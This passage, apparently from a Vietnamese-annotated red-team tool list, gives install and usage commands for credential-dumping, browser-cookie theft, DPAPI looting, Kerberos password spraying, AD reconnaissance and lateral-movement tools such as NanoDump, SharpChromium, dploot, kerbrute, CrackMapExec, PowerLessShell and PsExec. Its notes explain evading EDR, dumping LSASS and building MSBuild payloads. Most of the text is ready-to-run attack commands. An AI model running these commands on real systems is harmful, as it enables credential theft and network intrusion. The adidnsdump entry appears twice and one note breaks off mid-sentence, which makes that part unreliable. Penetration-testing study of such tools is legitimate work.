**Lưu ý:** Nếu sử dụng **framework C2 Cobalt Strike**, có một script `.cna` có thể được import để tích hợp **NanoDump** trực tiếp vào **beacon**, cho phép chạy nó trong bộ nhớ hoặc qua các kỹ thuật khác do **Cobalt Strike** hỗ trợ.

Full installation information can be found [tại đây](https://github.com/helpsystems/nanodump).

**Cách sử dụng:**

```bash
# Run
nanodump.x64.exe

# Leverage the Silent Process Exit technique
nanodump --silent-process-exit C:\Windows\Temp\

# Leverage the Shtinkering technique
nanodump --shtinkering
```
**Lưu ý:** Chạy tệp thực thi **nanodump**. **Nanodump** được thiết kế để **dump** bộ nhớ của tiến trình **LSASS** trên **Windows** một cách an toàn hơn so với các kỹ thuật khác, tránh bị **EDR** phát hiện bằng cách sử dụng các kỹ thuật thay thế (ví dụ: Silent Process Exit, Shtinkering). Bạn có thể chỉ định kỹ thuật và nơi lưu file dump. File dump này sau đó có thể được crack bằng **Mimikatz** hoặc các công cụ khác để lấy thông tin xác thực. Cần quyền quản trị viên hoặc quyền `SeDebugPrivilege`.

Full usage information can be found [tại đây](https://github.com/helpsystems/nanodump#1-usage).

![nanodump](https://user-images.githubusercontent.com/100603074/210985548-a5e69f62-04da-4771-b06b-720147de08d0.jpg)

*Hình ảnh được sử dụng từ https://github.com/helpsystems/nanodump*

### [🔙](#tool-list)[**eviltree**](https://github.com/t3l3machus/eviltree)

A standalone python3 remake of the classic "tree" command with the additional feature of searching for user provided keywords/regex in files, highlighting those that contain matches. Created for two main reasons:

- While searching for secrets in files of nested directory structures, being able to visualize which files contain user provided keywords/regex patterns and where those files are located in the hierarchy of folders, provides a significant advantage.
- `tree` is an amazing tool for analyzing directory structures. It's really handy to have a standalone alternative of the command for **post-exploitation enumeration** as it is not pre-installed on every **linux** distro and is kind of limited on **Windows** (compared to the UNIX version).

**Install:**

```bash
git clone https://github.com/t3l3machus/eviltree
```
**Lưu ý:** Cài đặt bằng **Git**.

**Cách sử dụng:**

```bash
# Running a regex that essentially matches strings similar to: password = something against /var/www
python3 eviltree.py -r /var/www -x ".{0,3}passw.{0,3}[=]{1}.{0,18}" -v

# Using comma separated keywords instead of regex
python3 eviltree.py -r C:\Users\USERNAME -k passw,admin,account,login,user -L 3 -v
```
**Lưu ý:** Các ví dụ sử dụng **script Python eviltree.py**. `-r` chỉ định thư mục gốc để duyệt. `-x` chỉ định regex để tìm kiếm trong nội dung file. `-k` chỉ định danh sách các từ khóa (ngăn cách bởi dấu phẩy) để tìm kiếm. `-v` bật chế độ chi tiết. `-L` giới hạn độ sâu của thư mục. Công cụ này hữu ích để khám phá các file chứa thông tin nhạy cảm (như mật khẩu) trong một hệ thống đã bị xâm nhập (**Linux** hoặc **Windows**).

![image](https://user-images.githubusercontent.com/100603074/212204831-9887b976-dee8-4520-bbd6-e6e69da711ed.png)

*Hình ảnh được sử dụng từ https://github.com/t3l3machus/eviltree*

### [🔙](#tool-list)[**SeeYouCM-Thief**](https://github.com/trustedsec/SeeYouCM-Thief)

Simple tool to automatically download and parse configuration files from **Cisco phone systems** searching for SSH credentials.

Will also optionally enumerate active directory users from the UDS API.

[Blog - Exploiting common misconfigurations in cisco phone systems](https://www.trustedsec.com/blog/seeyoucm-thief-exploiting-common-misconfigurations-in-cisco-phone-systems/)

**Install:**

```bash
git clone https://github.com/trustedsec/SeeYouCM-Thief
python3 -m pip install -r requirements.txt
```
**Lưu ý:** Cài đặt bằng **Git** và **Python** với các dependency cần thiết.

**Cách sử dụng:**

```bash
# Enumerate Active Directory users from the UDS api on the CUCM
./thief.py -H <CUCM server> --userenum

# Without specifying a phone IP address the script will attempt to download every config in the listing.
./thief.py -H <Cisco CUCM Server> [--verbose]

# Parse the web interface for the CUCM address and will do a reverse lookup for other phones in the same subnet.
./thief.py --phone <Cisco IP Phoner> [--verbose]

# Specify a subnet to scan with reverse lookups.
./thief.py --subnet <subnet to scan> [--verbose]
```
**Lưu ý:** Sử dụng **script Python thief.py**. Nó nhắm vào các server Cisco Unified Communications Manager (**CUCM**) và các điện thoại IP của Cisco. `--userenum` để liệt kê người dùng AD qua API của **CUCM**. `-H` chỉ định server CUCM. `--phone` hoặc `--subnet` chỉ định các điện thoại mục tiêu để cố gắng tải file cấu hình về. Công cụ này khai thác các cấu hình mặc định/yếu phổ biến trên các hệ thống điện thoại Cisco để lấy thông tin nhạy cảm như SSH credential từ file cấu hình hoặc liệt kê người dùng.

![image](https://user-images.githubusercontent.com/100603074/212204860-a20c83dd-a4f7-4c6f-a760-5925d4ae1e03.png)

*Hình ảnh được sử dụng từ https://www.trustedsec.com/blog/seeyoucm-thief-exploiting-common-misconfigurations-in-cisco-phone-systems/*

### [🔙](#tool-list)[**MailSniper**](https://github.com/dafthack/MailSniper)

**MailSniper** is a penetration testing tool for searching through email in a **Microsoft Exchange** environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used as a non-administrative user to search their own email or by an **Exchange administrator** to search the mailboxes of every user in a domain.

**MailSniper** also includes additional modules for password spraying, enumerating users and domains, gathering the Global Address List (GAL) from OWA and EWS and checking mailbox permissions for every **Exchange** user at an organization.

Nice blog post with more information about [tại đây](https://www.blackhillsinfosec.com/introducing-mailsniper-a-tool-for-searching-every-users-email-for-sensitive-data/).

[**MailSniper** Field Manual](http://www.dafthack.com/files/MailSniper-Field-Manual.pdf)

**Install:**

```
git clone https://github.com/dafthack/MailSniper
cd MailSniper
Import-Module MailSniper.ps1
```
**Lưu ý:** Tải mã nguồn **script PowerShell**, di chuyển vào thư mục và import script như một module. Công cụ này chạy trên **Windows PowerShell**.

**Cách sử dụng:**

```bash
# Search current users mailbox
Invoke-SelfSearch -Mailbox current-user@domain.com
```
**Lưu ý:** `Invoke-SelfSearch` là một trong các hàm (**cmdlet**) của **MailSniper**. Hàm này cho phép người dùng hiện tại quét hộp thư email của chính họ trên **Microsoft Exchange** để tìm các từ khóa nhạy cảm. **MailSniper** có nhiều cmdlet khác cho các tác vụ phức tạp hơn (ví dụ: quét toàn bộ domain nếu có quyền admin Exchange, password spraying vào OWA, ...).

![image](https://user-images.githubusercontent.com/100603074/217654320-3d74551c-e37a-4398-b354-a1ed7f982cd0.png)

*Hình ảnh được sử dụng từ https://patrowl.io/*

### [🔙](#tool-list)[**SharpChromium**](https://github.com/djhohnstein/SharpChromium)

**SharpChromium** is a **.NET 4.0+ CLR project** to retrieve data from **Google Chrome, Microsoft Edge**, and **Microsoft Edge Beta**. Currently, it can extract:

- Cookies (in JSON format)
- History (with associated cookies for each history item)
- Saved Logins

This rewrite has several advantages to previous implementations, which include:

- No Type compilation or reflection required
- Cookies are displayed in JSON format, for easy importing into Cookie Editor.
- No downloading SQLite assemblies from remote resources.
- Supports major **Chromium browsers** (but extendable to others)

**Install:**

Using [Visual Studio Community Edition](https://visualstudio.microsoft.com/downloads/).

Open up the project .sln, choose "**release**", and **build**.
**Lưu ý:** Biên dịch mã nguồn **C#** bằng **Visual Studio** để tạo file thực thi **SharpChromium.exe**.

**Cách sử dụng:**

```bash
# Retrieve cookies associated with Google Docs and Github
.\SharpChromium.exe cookies docs.google.com github.com

# Retrieve history items and their associated cookies.
.\SharpChromium.exe history

# Retrieve saved logins (Note: Only displays those with non-empty passwords):
.\SharpChromium.exe logins
```
**Lưu ý:** Sử dụng **SharpChromium.exe** với các đối số khác nhau (`cookies`, `history`, `logins`). Công cụ này chạy trên **Windows** cục bộ nơi các trình duyệt dựa trên **Chromium** được cài đặt. Nó truy cập các file cấu hình của trình duyệt để giải mã và trích xuất thông tin nhạy cảm đã lưu (thường cần chạy dưới cùng user profile với nạn nhân hoặc với quyền đọc các file đó).

![image](https://user-images.githubusercontent.com/100603074/220959335-6e7a8275-bad9-4c3f-883f-2d7ab6749b75.png)

*Hình ảnh được sử dụng từ https://github.com/djhohnstein/SharpChromium*

### [🔙](#tool-list)[**dploot**](https://github.com/zblurx/dploot)

**DPAPI** (Data Protection Application Programming Interface) provides a set of APIs to encrypt and decrypt data where a user password is typically used to set the 'master key' (in a user scenario). So to leverage **DPAPI** to gain access to certain data (**Chrome Cookies/Login Data, the Windows Credential Manager/Vault** etc) we just need access to a password.

**dploot** is **Python** rewrite of **SharpDPAPI** written un **C#** by Harmj0y, which is itself a port of **DPAPI** from **Mimikatz** by gentilkiwi. It implements all the **DPAPI** logic of these tools, but this time it is usable with a **python interpreter** and from a **Linux environment**.

[Blog - Operational Guidance for Offensive User DPAPI Abuse](https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107)

**Install (Pip):**

```bash
pip install dploot
```
**Lưu ý:** Cài đặt thư viện **Python** **dploot**.

**Install (Git):**

```bash
git clone https://github.com/zblurx/dploot.git
cd dploot
make
```
**Lưu ý:** Cài đặt từ mã nguồn **Python** và sử dụng **make** để chuẩn bị các thành phần cần thiết (ví dụ: build module **C** nếu có).

**Cách sử dụng:**

```bash
# Loot decrypted machine private key files as a Windows local administrator
dploot machinecertificates -d waza.local -u Administrator -p 'Password!123' 192.168.56.14 -quiet

# Loot the DPAPI backup key as a Windows Domain Administrator (Will allow attacker to loot and decrypt any DPAPI protected password realted to a domain user)
dploot backupkey -d waza.local -u Administrator -p 'Password!123' 192.168.56.112 -quiet

# Leverage the DPAPI backup key `key.pvk` to loot any user secrets stored on Windows domain joined endpoints
dploot certificates -d waza.local -u Administrator -p 'Password!123' 192.168.56.14 -pvk key.pvk  -quiet
```
**Lưu ý:** Sử dụng **script Python dploot**. Các ví dụ này minh họa cách **dploot** được sử dụng từ máy attacker (thường là **Linux**) để kết nối đến máy **Windows** mục tiêu từ xa và trích xuất các khóa **DPAPI** (`machinecertificates`, `backupkey`) hoặc sử dụng khóa **DPAPI** đã thu thập (`-pvk`) để giải mã các bí mật khác (`certificates`). `-d`, `-u`, `-p` cung cấp thông tin xác thực domain hoặc cục bộ. Kỹ thuật này khai thác cơ chế bảo vệ dữ liệu của **Windows** (**DPAPI**) để lấy các bí mật được mã hóa.

**Discovery**
====================

### [🔙](#tool-list)[**PCredz**](https://github.com/lgandx/PCredz)

This tool extracts **Credit card numbers, NTLM(DCE-RPC, HTTP, SQL, LDAP, etc), Kerberos (AS-REQ Pre-Auth etype 23), HTTP Basic, SNMP, POP, SMTP, FTP, IMAP**, etc from a **pcap file** or from a live interface.

**Install:**

```bash
git clone https://github.com/lgandx/PCredz
```
**Lưu ý:** Cài đặt bằng **Git**.

**Cách sử dụng:** (Full Usage [tại đây](https://github.com/lgandx/PCredz#usage))

**Cách sử dụng:** (PCAP File Folder)

```python
python3 ./Pcredz -d /tmp/pcap-directory-to-parse/
```
**Lưu ý:** Chạy script **Python PCredz** với cờ `-d` để xử lý tất cả các file `.pcap` trong một thư mục. Yêu cầu cài đặt thư viện `scapy` trong Python.

**Cách sử dụng:** (Live Capture)

```python
python3 ./Pcredz -i eth0 -v
```
**Lưu ý:** Chạy **script PCredz** với cờ `-i` để lắng nghe trên giao diện mạng cụ thể (`eth0`) và cờ `-v` để bật chế độ chi tiết. Yêu cầu quyền đủ để đọc lưu lượng mạng thô (raw packet), thường cần quyền root. Nó phân tích các gói tin mạng để trích xuất thông tin xác thực.

![image](https://user-images.githubusercontent.com/100603074/191007004-a0fd01f3-e01f-4bdb-b89e-887c85a7be91.png)

### [🔙](#tool-list)[**PingCastle**](https://github.com/vletoux/pingcastle)

**Ping Castle** is a tool designed to assess quickly the **Active Directory security level** with a methodology based on risk assessment and a maturity framework. It does not aim at a perfect evaluation but rather as an efficiency compromise.

**Install:** (Download)

```
https://github.com/vletoux/pingcastle/releases/download/2.11.0.1/PingCastle_2.11.0.1.zip
```
**Lưu ý:** Tải xuống file zip chứa file thực thi **PingCastle.exe**. Đây là công cụ chạy trên **Windows**.

**Cách sử dụng:**

```python
./PingCastle.exe
```
**Lưu ý:** Chạy tệp thực thi **PingCastle.exe**. Công cụ thường tự động phát hiện **domain Active Directory** và thực hiện đánh giá bảo mật dựa trên nhiều tiêu chí, tạo ra một báo cáo chi tiết. Cần có quyền hạn nhất định trong **domain** để thực hiện các kiểm tra.

![image](https://user-images.githubusercontent.com/100603074/191008405-39bab2dc-54ce-43d1-aed7-53956776a9ef.png)

### [🔙](#tool-list)[**Seatbelt**](https://github.com/GhostPack/Seatbelt)

**Seatbelt** is a useful tool for gathering detailed information about the security posture of a target **Windows** machine in order to identify potential vulnerabilities and attack vectors.

It is designed to be run on a compromised victim machine to gather information about the current security configuration, including information about installed software, services, group policies, and other security-related settings

**Install (Biên dịch):**

**Seatbelt** has been built against **.NET 3.5** and **4.0** with **C# 8.0** features and is compatible with [Visual Studio Community Edition](https://visualstudio.microsoft.com/downloads/).

Open up the project .sln, choose "**release**", and **build**.
**Lưu ý:** Biên dịch mã nguồn C# bằng Visual Studio.

**Cách sử dụng:**

```bash
# Run all checks and output to output.txt
Seatbelt.exe -group=all -full > output.txt

# Return 4624 logon events for the last 30 days
Seatbelt.exe "LogonEvents 30"

# Query the registry three levels deep, returning only keys/valueNames/values that match the regex .*defini.*
Seatbelt.exe "reg \"HKLM\SOFTWARE\Microsoft\Windows Defender\" 3 .*defini.* true"

# Run remote-focused checks against a remote system
Seatbelt.exe -group=remote -computername=192.168.230.209 -username=THESHIRE\sam -password="yum \"po-ta-toes\""
```
**Lưu ý:** Sử dụng **công cụ Seatbelt.exe** với các đối số khác nhau. `-group=all` chạy tất cả các module kiểm tra thông tin. `-full` bao gồm tất cả các kiểm tra chi tiết. Output thường được chuyển hướng (`>`) ra file. **Seatbelt** có các nhóm lệnh cụ thể (ví dụ: `LogonEvents`, `reg`) để thực hiện các kiểm tra tập trung vào các loại dữ liệu khác nhau. Có thể chạy cục bộ hoặc từ xa (với thông tin xác thực). Công cụ chạy trên **Windows** và rất hữu ích cho giai đoạn **discovery** và **recon** cục bộ sau khi đã có quyền truy cập ban đầu.

Full command groups and parameters can be found [tại đây](https://github.com/GhostPack/Seatbelt#command-groups).

![image](https://user-images.githubusercontent.com/100603074/210137456-14eb3329-f29d-4ce1-a595-3466bd5a962f.png)

*Hình ảnh được sử dụng từ https://exord66.github.io/csharp-in-memory-assemblies*

### [🔙](#tool-list)[**ADRecon**](https://github.com/sense-of-security/adrecon)

Great tool for gathering information about a victim's Microsoft **Active Directory (AD)** environment, with support for **Excel** outputs.

It can be run from any workstation that is connected to the environment, even hosts that are not domain members.

[BlackHat USA 2018 SlideDeck](https://speakerdeck.com/prashant3535/adrecon-bh-usa-2018-arsenal-and-def-con-26-demo-labs-presentation)

**Prerequisites**

- .NET Framework 3.0 or later (**Windows 7** includes 3.0)
- **PowerShell** 2.0 or later (**Windows 7** includes 2.0)

**Install (Git):**

```bash
git clone https://github.com/sense-of-security/ADRecon.git
```
**Lưu ý:** Tải mã nguồn **script PowerShell** bằng **Git**.

**Install (Download):**

You can download a zip archive of the [latest release](https://github.com/sense-of-security/adrecon/archive/master.zip).
**Lưu ý:** Tải xuống file zip chứa script.

**Cách sử dụng:**

```bash
# To run ADRecon on a domain member host.
PS C:\> .\ADRecon.ps1

# To run ADRecon on a domain member host as a different user.
PS C:\>.\ADRecon.ps1 -DomainController <IP or FQDN> -Credential <domain\username>

# To run ADRecon on a non-member host using LDAP.
PS C:\>.\ADRecon.ps1 -Protocol LDAP -DomainController <IP or FQDN> -Credential <domain\username>

# To run ADRecon with specific modules on a non-member host with RSAT. (Default OutputType is STDOUT with -Collect parameter)
PS C:\>.\ADRecon.ps1 -Protocol ADWS -DomainController <IP or FQDN> -Credential <domain\username> -Collect Domain, DomainControllers
```
**Lưu ý:** Các ví dụ về cách chạy **script PowerShell ADRecon.ps1**. Bạn có thể chạy nó trên máy là thành viên domain, máy không phải thành viên domain (sử dụng LDAP hoặc ADWS), và với thông tin xác thực được chỉ định (`-Credential`). `ADRecon` tự động thu thập nhiều thông tin khác nhau về **Active Directory** và có thể xuất báo cáo ra nhiều định dạng (ví dụ: file Excel) để phân tích dễ dàng. Hữu ích cho giai đoạn **discovery** trong môi trường **AD**.

Full usage and parameter information can be found [tại đây](https://github.com/sense-of-security/adrecon#usage).

![image](https://user-images.githubusercontent.com/100603074/210137064-2a0247b3-5d28-409a-904b-0fd9db87ef56.png)

*Hình ảnh được sử dụng từ https://vk9-sec.com/domain-enumeration-powerview-adrecon/*

### [🔙](#tool-list)[**adidnsdump**](https://github.com/dirkjanm/adidnsdump)

By default any user in **Active Directory** can enumerate all DNS records in the **Domain or Forest DNS zones**, similar to a zone transfer.

This tool enables enumeration and exporting of all DNS records in the zone for **recon** purposes of internal networks.

**Install (Pip):**

```bash
pip install git+https://github.com/dirkjanm/adidnsdump#egg=adidnsdump
```
**Lưu ý:** Cài đặt **công cụ Python adidnsdump** trực tiếp từ URL **GitHub** bằng pip.

**Install (Git):**

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .
```
**Lưu ý:** Cài đặt từ mã nguồn bằng **Git** và pip.

**Note:** *The tool requires `impacket` and `dnspython` to function. While the tool works with both **Python 2** and **3, Python 3** support requires you to install [impacket from GitHub](https://github.com/CoreSecurity/impacket).*

**Cách sử dụng:**

```bash
# Display the zones in the domain where you are currently in
adidnsdump -u icorp\\testuser --print-zones icorp-dc.internal.corp

# Display all zones in the domain
adidnsdump -u icorp\\testuser icorp-dc.internal.corp

# Resolve all unknown records (-r)
adidnsdump -u icorp\\testuser icorp-dc.internal.corp -r
```
**Lưu ý:** Sử dụng **công cụ adidnsdump**. `-u` cung cấp thông tin xác thực user (`domain\username`) để kết nối tới Domain Controller

### [🔙](#tool-list)[**adidnsdump**](https://github.com/dirkjanm/adidnsdump)

By default any user in **Active Directory** can enumerate all DNS records in the **Domain or Forest DNS zones**, similar to a zone transfer.

This tool enables enumeration and exporting of all DNS records in the zone for **recon** purposes of internal networks.

**Install (Pip):**

```bash
pip install git+https://github.com/dirkjanm/adidnsdump#egg=adidnsdump
```
**Lưu ý:** Cài đặt **công cụ Python adidnsdump** trực tiếp từ URL **GitHub** bằng pip.

**Install (Git):**

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .
```
**Lưu ý:** Cài đặt từ mã nguồn bằng **Git** và pip.

**Note:** *The tool requires `impacket` and `dnspython` to function. While the tool works with both **Python 2** and **3, Python 3** support requires you to install [impacket from GitHub](https://github.com/CoreSecurity/impacket).*
**Lưu ý:** Lưu ý quan trọng về các thư viện **Python** phụ thuộc (`impacket`, `dnspython`).

**Cách sử dụng:**

```bash
# Hiển thị các zone trong domain hiện tại
adidnsdump -u icorp\\testuser --print-zones icorp-dc.internal.corp

# Hiển thị tất cả các zone trong domain
adidnsdump -u icorp\\testuser icorp-dc.internal.corp

# Resolve tất cả các bản ghi chưa biết (-r)
adidnsdump -u icorp\\testuser icorp-dc.internal.corp -r
```
**Lưu ý:** Sử dụng **công cụ adidnsdump**. `-u` cung cấp thông tin xác thực user (`domain\username`) để kết nối tới Domain Controller (`icorp-dc.internal.corp`). `--print-zones` chỉ hiển thị các zone có sẵn, bỏ qua các bản ghi chi tiết. Chạy không có `--print-zones` sẽ **dump** tất cả các bản ghi **DNS**. Cờ `-r` cố gắng resolve (tra cứu IP) các bản ghi được **dump**. Kỹ thuật này dựa vào cấu hình mặc định của **Active Directory** cho phép mọi người dùng đọc các bản ghi **DNS** của zone.

[Blog - Getting in the Zone: dumping Active Directory DNS using adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

![adidnsdump](https://user-images.githubusercontent.com/100603074/210986363-724e6611-12e9-4a0d-abfa-c44665010b97.jpg)

*Hình ảnh được sử dụng từ https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/*

### [🔙](#tool-list)[**kerbrute**](https://github.com/ropnop/kerbrute)

A tool to quickly bruteforce and enumerate valid **Active Directory accounts** through **Kerberos Pre-Authentication**.

**Install (Go):**

```bash
go get github.com/ropnop/kerbrute
```
**Lưu ý:** Cài đặt **công cụ Golang** **kerbrute**.

**Install (Make):**

```bash
git clone https://github.com/ropnop/kerbrute
cd kerbrute
make all
```
**Lưu ý:** Biên dịch từ mã nguồn bằng **Git** và **Make**.

**Cách sử dụng:**

```bash
# Liệt kê người dùng
./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt

# Password Spray
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123

# Brute User
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman

# Brute Force
./kerbrute -d lab.ropnop.com bruteforce -
```
**Lưu ý:** Các ví dụ sử dụng tệp nhị phân `kerbrute` trên **Linux**. `-d` chỉ định tên miền **Active Directory**. `userenum` thực hiện liệt kê tên người dùng từ một danh sách (`usernames.txt`) thông qua phản hồi lỗi **Kerberos pre-authentication**. `passwordspray` thực hiện tấn công password spray (`Password123`) lên một danh sách người dùng domain (`domain_users.txt`). `bruteuser` **brute force** mật khẩu cho một người dùng cụ thể (`thoffman`) từ một wordlist mật khẩu (`passwords.lst`).

![image](https://user-images.githubusercontent.com/100603074/212205129-e5906b50-78c5-4507-8b1e-74a6686bed14.png)

*Hình ảnh được sử dụng từ https://matthewomccorkle.github.io/day_032_kerbrute/*

### [🔙](#tool-list)[**scavenger**](https://github.com/SpiderLabs/scavenger)

**Scavenger** is a multi-threaded **post-exploitation** scanning tool for scavenging systems, finding most frequently used files and folders as well as "interesting" files containing sensitive information.

**Scavenger** confronts a challenging issue typically faced by **Penetration Testing** consultants during internal penetration tests; the issue of having too much access to too many systems with limited days for testing.

**Install:**

First install **CrackMapExec** from [tại đây](https://github.com/byt3bl33d8d/CrackMapExec/wiki/Installation).
**Lưu ý:** **Scavenger** phụ thuộc vào **CrackMapExec**, vì vậy cần cài đặt **CME** trước.

```bash
git clone https://github.com/SpiderLabs/scavenger
cd scavenger
```
**Lưu ý:** Tải mã nguồn của **Scavenger**.

**Cách sử dụng:**

```bash
# Tìm các tệp đáng chú ý trên điểm cuối của nạn nhân
python3 ./scavenger.py smb -t 10.0.0.10 -u administrator -p Password123 -d test.local
```
**Lưu ý:** Chạy **script Python scavenger.py**. `smb` chỉ định giao thức để quét (**SMB file shares**). `-t` là IP mục tiêu. `-u`, `-p`, `-d` cung cấp thông tin xác thực **domain** để truy cập các share. **Scavenger** sẽ tìm kiếm các tệp và thư mục theo các quy tắc định sẵn để phát hiện thông tin nhạy cảm.

Nice [blog post](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/scavenger-post-exploitation-tool-for-collecting-vital-data/).

![image](https://user-images.githubusercontent.com/100603074/216736914-e7a7fe26-3531-4ae1-9962-fce130d8ab62.png)

*Hình ảnh được sử dụng từ https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/scavenger-post-exploitation-tool-for-collecting-vital-data/*

**Lateral Movement**
====================

### [🔙](#tool-list)[**crackmapexec**](https://github.com/Porchetta-Industries/CrackMapExec)

This is a great tool for pivoting in a **Windows/Active Directory** environment using credential pairs (**username:password**, **username:hash**). It also offered other features including enumerating logged on users and spidering SMB shares to executing psexec style attacks, auto-injecting Mimikatz/Shellcode/DLL’s into memory using Powershell, dumping the NTDS.dit and more.

**Install:**

```bash
sudo apt install crackmapexec
```
**Lưu ý:** Cài đặt tiêu chuẩn trên **Linux/Debian/Ubuntu** sử dụng **apt**.

**Cách sử dụng:**

```bash
crackmapexec smb <ip address> -d <domain> -u <user list> -p <password list>
```
**Lưu ý:** Sử dụng `crackmapexec` với subcommand `smb` để tương tác qua giao thức **SMB**. `<ip address>` là IP của máy mục tiêu hoặc dải IP/file IP. `-d` là tên domain. `-u` và `-p` cung cấp danh sách người dùng và mật khẩu/hash để thử đăng nhập vào máy mục tiêu. Sau khi đăng nhập thành công, **CrackMapExec** có thể thực hiện nhiều tác vụ khác như thực thi lệnh, liệt kê session, truy cập share...

![image](https://user-images.githubusercontent.com/100603074/192070626-4549ec06-e2c5-477b-a97d-0f29e48bbfbc.png)

### [🔙](#tool-list)[**WMIOps**](https://github.com/FortyNorthSecurity/WMIOps)

**WMIOps** is a powershell script that uses WMI to perform a variety of actions on hosts, local or remote, within a Windows environment.

Developed by [@christruncer](https://twitter.com/christruncer).

Original [blog post](https://www.christophertruncer.com/introducing-wmi-ops/) documenting release.

**Install (PowerShell):**

```bash
git clone https://github.com/FortyNorthSecurity/WMIOps
Import-Module WMIOps.ps1
```
**Lưu ý:** Tải mã nguồn script **PowerShell** và import nó vào phiên PowerShell hiện tại.

**Cách sử dụng:**

```bash
# Thực thi lệnh do người dùng chỉ định trên máy mục tiêu
Invoke-ExecCommandWMI

# Trả về tất cả các tiến trình đang chạy từ máy mục tiêu
Get-RunningProcessesWMI

# Kiểm tra xem người dùng có hoạt động tại desktop trên máy mục tiêu không (hoặc nếu vắng mặt)
Find-ActiveUsersWMI

# Liệt kê tất cả các ổ đĩa cục bộ và được kết nối mạng trên hệ thống mục tiêu
Get-SystemDrivesWMI

# Thực thi một script powershell trong bộ nhớ trên máy chủ mục tiêu thông qua WMI và trả về kết quả
Invoke-RemoteScriptWithOutput
```
**Lưu ý:** Các hàm (cmdlet) của module **WMIOps**. Chúng sử dụng **WMI** để thực hiện các tác vụ từ xa trên các máy **Windows** mục tiêu. Cần quyền quản trị trên máy mục tiêu để thực hiện hầu hết các tác vụ này thông qua **WMI**.

![image](https://user-images.githubusercontent.com/100603074/210266302-9c098f03-24fd-4f91-af63-db2fe04c01c7.png)

![image](https://user-images.githubusercontent.com/100603074/210266314-e51c7c99-1e2a-473e-926c-074b56fe79a5.png)

*Images used from https://pentestlab.blog/2017/11/20/command-and-control-wmi/*

### [🔙](#tool-list)[**PowerLessShell**](https://github.com/Mr-Un1k0d3r/PowerLessShell)

Tool that uses **MSBuild.exe** to remotely execute **PowerShell scripts** and commands without spawning **powershell.exe**.

**Install:**

```bash
git clone https://github.com/Mr-Un1k0d3r/PowerLessShell
cd PowerLessShell
```
**Lưu ý:** Tải mã nguồn bằng **Git**. Công cụ này chủ yếu dựa vào một **script Python** để tạo các file dự án **MSBuild**.

**Cách sử dụng:**

```bash
# Help
python PowerLessShell.py -h

# Generate PowerShell payload
python PowerLessShell.py -type powershell -source script.ps1 -output malicious.csproj

# Generating a shellcode payload
python PowerLessShell.py -source shellcode.raw -output malicious.csproj
```
**Lưu ý:** Sử dụng **script Python PowerLessShell.py**. Công cụ này tạo ra một file `.csproj` (file dự án **Visual Studio**) chứa mã **XML** lợi dụng chức năng tích hợp sẵn của **MSBuild.exe** để thực thi mã tùy ý. File `.csproj` được tạo này sau đó có thể được chạy trên máy **Windows** mục tiêu bằng **MSBuild.exe**. Điều này giúp thực thi **PowerShell** hoặc shellcode mà không trực tiếp chạy tiến trình **powershell.exe**.

Full usage information can be found [tại đây](https://github.com/Mr-Un1k0d3r/PowerLessShell#usage).

![image](https://user-images.githubusercontent.com/100603074/210266357-75a3f09d-9855-46d5-ad13-69c677b4499f.png)

*Image used from https://bank-security.medium.com/how-to-running-powershell-commands-without-powershell-exe-a6a19595f628*

### [🔙](#tool-list)[**PsExec**](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)

**PsExec** is a part of the **Sysinternals** suite of tools, which is a collection of utilities for managing and troubleshooting **Windows systems**.

It is great for remotely executing commands on target machines.

**Note:** Some AVs detect **PsExec** as a 'remote admin' virus.
**Lưu ý:** **PsExec** là một **công cụ** chính thống của **Microsoft** nhưng do khả năng thực thi từ xa của nó, nó thường bị **AV** gắn cờ như một công cụ quản trị từ xa có khả năng bị lạm dụng (Potentially Unwanted Application - **PUA** hoặc "hacker tool").

**Install (PowerShell):**

```bash
Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/PSTools.zip' -OutFile 'pstools.zip'
Expand-Archive -Path 'pstools.zip' -DestinationPath "$env:TEMP\pstools"
Move-Item -Path "$env:TEMP\pstools\psexec.exe" .
Remove-Item -Path "$env:TEMP\pstools" -Recurse
```
**Lưu ý:** Đoạn mã **PowerShell** này tải về gói **PSTools** của **Sysinternals**, giải nén, di chuyển chỉ tệp **psexec.exe** vào thư mục hiện tại và xóa các tệp tạm thời. Cách cài đặt tiện lợi trên **Windows PowerShell**.

**Cách sử dụng:**

```bash
# Prevent the license agreement from being displayed
psexec.exe /accepteula

# Run the 'hostname' command on remote machine
psexec.exe \\REMOTECOMPUTER hostname

# Run the 'hostname' command on EVERYTHING (on the domain)
psexec.exe \\* hostname

# Run a local executable on a remote machine
psexec.exe \\REMOTECOMPUTER -c C:\Tools\program.exe

# Run the 'hostname' command with different credentials
psexec.exe \\REMOTECOMPUTER hostname -u localadmin -p secret-p@$$word

# Spawn shell on remote machine
psexec.exe -s \\REMOTECOMPUTER cmd
```
**Lưu ý:** Các ví dụ sử dụng **PsExec.exe** với các tùy chọn dòng lệnh. Cần quyền quản trị trên máy tính từ xa để sử dụng **PsExec**. `\\REMOTECOMPUTER` được thay thế bằng tên máy tính hoặc địa chỉ IP. `/accepteula` bỏ qua yêu cầu chấp nhận EULA lần đầu. `-c` copy file thực thi từ máy local đến máy remote và chạy nó. `-u` và `-p` cung cấp thông tin xác thực. `-s` chạy tiến trình với quyền SYSTEM trên máy từ xa, hữu ích để có shell **SYSTEM**. **PsExec** sử dụng kết nối **SMB** và dịch vụ ẩn (psexesvc) để thực thi.

Great [blog post](https://adamtheautomator.com/psexec/) on **PsExec** usage.

![image](https://user-images.githubusercontent.com/100603074/210266376-8daa51d6-16d4-4422-b723-d1bc8b7f22e2.png)

*Image used from https://adamtheautomator.com/psexec/*

### [🔙](#tool-list)[**LiquidSnake**](https://github.com/RiccardoAncarani/LiquidSnake)

**Liquid Snake** is a program aimed at performing **lateral movement** against **Windows systems** without touching the disk.

